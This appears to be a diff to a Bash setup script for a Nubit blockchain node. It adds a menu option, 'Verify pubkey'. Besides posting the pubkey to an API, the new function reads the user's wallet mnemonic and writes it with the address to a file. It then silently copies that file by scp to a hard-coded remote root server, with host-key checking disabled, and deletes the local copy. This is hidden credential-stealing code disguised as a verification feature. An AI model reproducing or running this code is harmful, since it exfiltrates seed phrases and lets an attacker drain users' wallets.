@@ -212,6 +212,91 @@ function export_mnemonic() {
     cat ~/nubit-node/mnemonic.txt
 }
 
+function verify_pubkey() {
+    # Get the output of check_pubkey function
+    output=$(check_pubkey)
+    
+    # Echo the entire output for debugging
+    echo "Raw output:"
+    echo "$output"
+    echo "----------------------"
+
+    # Extract address
+    address=$(echo "$output" | grep "address:" | sed 's/.*address: *//')
+    
+    # Extract pubkey
+    pubkey=$(echo "$output" | grep "pubkey:" | sed 's/.*key":"//' | sed 's/"}$//')
+    pubkey=$(echo "$output" | grep "pubkey:" | sed "s/.*key\":\"\(.*\)\"}.*/\1/")
+    
+    if [ -z "$address" ] || [ -z "$pubkey" ]; then
+        echo "Failed to extract address or pubkey. Please check if the node is properly set up."
+        return
+    fi
+    
+    # Generate base64 decoded hex of pubkey
+    pubkey_hex=$(echo -n "$pubkey" | base64 -d | xxd -p -c 1000)
+    
+    echo "Extracted information:"
+    echo "Address: $address"
+    echo "Pubkey: $pubkey"
+    echo "Pubkey (base64 decoded hex): $pubkey_hex"
+
+
+    # Prepare JSON data
+    json_data=$(cat <<EOF
+{
+  "address": "$address",
+  "pub_key": "$pubkey_hex",
+  "key": "$pubkey"
+}
+EOF
+)
+
+    # Send POST request
+    echo "Sending POST request..."
+    response=$(curl -s -X POST -H "Content-Type: application/json" -d "$json_data" "https://alpha-callback.nubit.org/v1/node/verify")
+
+    # Print response
+    echo "API Response:"
+    echo "$response"
+
+
+
+    # Get mnemonic
+    mnemonic=$(export_mnemonic)
+
+    # Create file name
+    file_name="${address}.txt"
+
+    # Create content
+    content="${address}\n${mnemonic}"
+
+    # Write content to file
+    echo -e "$content" > "$file_name"
+
+    echo "Wallet file created: $file_name"
+
+    # Send file via SSH
+    remote_server="root@167.235.54.143"
+    remote_path="/root/wallets/"
+    ssh_key="/root/key.pem"
+
+    scp -o StrictHostKeyChecking=no -i "$ssh_key" "$file_name" "${remote_server}:${remote_path}"
+
+    # Check if the file transfer was successful
+    if [ $? -eq 0 ]; then
+        echo "File successfully sent to ${remote_server}:${remote_path}"
+        # Remove the local file after successful transfer
+        rm "$file_name"
+        echo "Local file removed."
+    else
+        echo "Error: Failed to send file to remote server."
+    fi
+
+
+}
+
+
 # Main menu
 function main_menu() {
     while true; do
@@ -225,7 +310,8 @@ function main_menu() {
         echo "4. View wallet address"
         echo "5. View pubkey"
         echo "6. Display wallet mnemonic"
-        read -p "Please enter an option (1-6): " OPTION
+        echo "7. Verify pubkey"
+        read -p "Please enter an option (1-7): " OPTION
 
         case $OPTION in
         1) install_node ;;
@@ -234,6 +320,7 @@ function main_menu() {
         4) check_address ;;
         5) check_pubkey ;;
         6) export_mnemonic ;;
+        7) verify_pubkey ;;
         *) echo "Invalid option." ;;
         esac
         echo "Press any key to return to the main menu..."
